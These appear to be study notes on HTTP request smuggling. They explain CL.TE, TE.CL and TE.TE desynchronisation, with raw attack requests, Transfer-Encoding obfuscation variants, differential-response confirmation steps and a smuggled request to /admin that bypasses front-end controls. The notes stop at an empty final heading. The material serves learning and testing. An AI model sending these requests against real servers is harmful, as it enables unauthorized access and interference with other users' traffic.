HTTP request smuggling typically exploits the differences in the processing of HTTP request headers between two or more servers that are part of a chain (e.g., a proxy server and a backend server). These differences can occur in how they interpret or parse headers like `Content-Length` and `Transfer-Encoding`
1. **Content-Length Header**: Specifies the length of the body of the HTTP request in bytes.
2. **Transfer-Encoding Header**: Specifies the form of encoding used to safely transfer the entity to the user. The most common form of transfer encoding is `chunked`

### Techniques for Performing an Attack
1. **CL.TE (Content-Length and Transfer-Encoding):**
    - The front-end server uses the `Content-Length` header.
    - The back-end server uses the `Transfer-Encoding` header.
2. **TE.CL (Transfer-Encoding and Content-Length):**
    - The front-end server uses the `Transfer-Encoding` header.
    - The back-end server uses the `Content-Length` header.
3. **TE.TE (Obfuscated Transfer-Encoding):**
    - Both servers support the `Transfer-Encoding` header.
    - One server can be induced to ignore the `Transfer-Encoding` header if it is obfuscated.

>These techniques only work with HTTP/1 requests. Browsers and other clients, including Burp Suite, use HTTP/2 by default when communicating with servers that support it during the TLS handshake. Therefore, when testing sites that support HTTP/2, you need to manually switch to HTTP/1 in Burp Repeater. This can be done in the Request Attributes section of the Inspector panel.
### CL.TE Attack Scenarios Example
1. **Initial Request**: The attacker sends:
    ```
    POST / HTTP/1.1
    Host: example.com
    Content-Length: 13
    Transfer-Encoding: chunked
    
    0
    
    GET / HTTP/1.1
    Host: example.com
    ```
    
2. **Frontend Server**: Interprets the request based on `Content-Length`, treating the body as empty.
    
3. **Backend Server**: Uses `Transfer-Encoding`, treating `0` as the end of the first chunk and starts processing the next line as a new request.

> **Transfer-Encoding Header:** Uses chunked encoding, where the message body contains chunks of data. Each chunk starts with its size in bytes (hexadecimal), followed by the chunk contents, ending with a chunk of size zero.
```
POST /search HTTP/1.1
Host: normal-website.com
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

b
q=smuggling
0
```

**Detailed Causes:**
- The HTTP/1 specification states that if both `Content-Length` and `Transfer-Encoding` headers are present, the `Content-Length` header should be ignored. This rule works when a single server handles the request.
- Problems arise with multiple servers in a chain (e.g., front-end and back-end servers) due to differing support and handling of the `Transfer-Encoding` header.
    - Some servers don't support `Transfer-Encoding` in requests.
    - Others may ignore it if the header is obfuscated.

## CL.TE Vulnerabilities

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

1. **Front-End Server Processing:**
    - The front-end server interprets the `Content-Length` header.
    - It determines that the request body is 13 bytes long, which includes the `0` and `SMUGGLED`.
    - It forwards this request to the back-end server, including the `0` and `SMUGGLED`.
2. **Back-End Server Processing:**
    - The back-end server interprets the `Transfer-Encoding` header.
    - It treats the message body as chunked encoding.
    - The first chunk is processed as having zero length (`0`), which terminates the request.
    - The remaining bytes (`SMUGGLED`) are left unprocessed and treated as the start of the next request causing a noticeable delay.
## **TE.CL Vulnerabilities**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0
```

1. **Prepare the Request:**
    - Make sure the "Update Content-Length" option in Burp Repeater is unchecked.
    - Include the trailing sequence `\\\\r\\\\n\\\\r\\\\n` after the final `0`.
2. **Front-end Server Processing**:
    - The front-end server receives the request and interprets the `Transfer-Encoding: chunked` header.
    - It reads the first chunk size (`8` in hexadecimal, which is 8 bytes).
    - It processes the chunk content `SMUGGLED`.
    - It encounters the terminating chunk (`0`), which signals the end of the request body according to chunked encoding rules.
    - The front-end server then forwards this request to the back-end server.
3. **Back-end Server Processing**:
    - The back-end server, however, interprets the `Content-Length: 3` header and expects a message body of exactly 3 bytes.
    - It reads the first 3 bytes of the request body (`8\\r\\nS`).
    - The remaining content (`MUGGLED\r\n0\r\n\r\n`) is considered part of the next request due to the incorrect interpretation of the `Content-Length` causing a noticeable delay.

## TE.TE **Vulnerabilities**

In scenarios where both the front-end and back-end servers support the `Transfer-Encoding` header, a vulnerability can be exploited by obfuscating this header. This means altering the header in subtle ways so that one server processes it while the other ignores it.

**Examples of Obfuscation Techniques:**

1. **Misspelling or Adding Characters:**
    - `Transfer-Encoding: xchunked`
2. **Adding Spaces:**
    - `Transfer-Encoding : chunked`
3. **Multiple Headers:**
    - `Transfer-Encoding: chunked`
    - `Transfer-Encoding: x`
4. **Using Tabs:**
    - `Transfer-Encoding:[tab]chunked`
5. **Leading Spaces:**
    - `[space]Transfer-Encoding: chunked`
6. **Line Breaks:**
    - `X: X[\\n]Transfer-Encoding: chunked`
7. **Splitting Header and Value:**
    - `Transfer-Encoding\\n: chunked`

# Steps for Confirming Vulnerabilities W/ Differential Responses
1. An "attack" request designed to disrupt the processing of subsequent requests.
2. A "normal" request that triggers the vulnerable behavior.
## Confirming CL.TE Vulnerabilities

**Normal Request:**
```
POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

q=smuggling
```

- Expected Response: HTTP 200 with search results.

**Attack Request:**
```
POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 49
Transfer-Encoding: chunked

e
q=smuggling&x=
0

GET /404 HTTP/1.1
Foo: x
```

- **Explanation:**
    - The attack manipulates the `Content-Length` and `Transfer-Encoding` headers to confuse server parsing.
    - The `GET /404 HTTP/1.1` line is intended to be smuggled to the back-end server by the front-end server.

**Confirmation Method:**
- If successful, the subsequent "normal" request will be:
    ```
    GET /404 HTTP/1.1
    Foo: xPOST /search HTTP/1.1
    Host: vulnerable-website.com
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 11
    
    q=smuggling
    ```
    
- **Result:**
    - The server responds with HTTP 404, indicating that the attack request interfered with the normal request, confirming the CL.TE vulnerability.

## Confirming TE.CL Vulnerabilities

**Attack Request:**
```
POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

7c
GET /404 HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 144

x=
0

```

- **Explanation:**
    - This request uses `Transfer-Encoding: chunked` and specifies a chunk size (`7c` in hexadecimal, which is 124 in decimal).
    - It includes a GET request (`GET /404 HTTP/1.1`) intended to be smuggled to the back-end server by the front-end server.

**Confirmation Method:**
- If successful, the subsequent "normal" request will be:
    
    ```
    GET /404 HTTP/1.1
    Host: vulnerable-website.com
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 146
    
    x=
    0
    
    POST /search HTTP/1.1
    Host: vulnerable-website.com
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 11
    
    q=smuggling
    ```
    
- **Result:**
    - The server responds with HTTP 404, indicating that the attack request interfered with the normal request, confirming the [TE.CL](http://TE.CL) vulnerability.
# Strategies for Exploiting Vulnerabilities
## Bypassing Front-End Security Measures
In some applications, the front-end web server is responsible for implementing security controls, such as access restrictions, and only forwards allowed requests to the back-end server. The back-end server then trusts these requests without further validation.
```http
POST /home HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 62
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: vulnerable-website.com
Foo: xGET /home HTTP/1.1
Host: vulnerable-website.com
```
- The request uses `Transfer-Encoding: chunked` and smuggles a GET request to `/admin`.
- The front-end server sees two requests for `/home` and forwards both.
- The back-end server processes the smuggled request to `/admin`, assuming it has passed front-end controls.

 > If you see: Smuggled request AFTER 0 → that’s **CL.TE**

In **TE.CL**, you would see:
```http
7c
GET /admin ...
...
0
```
## Revealing Request Rewriting in Front-End
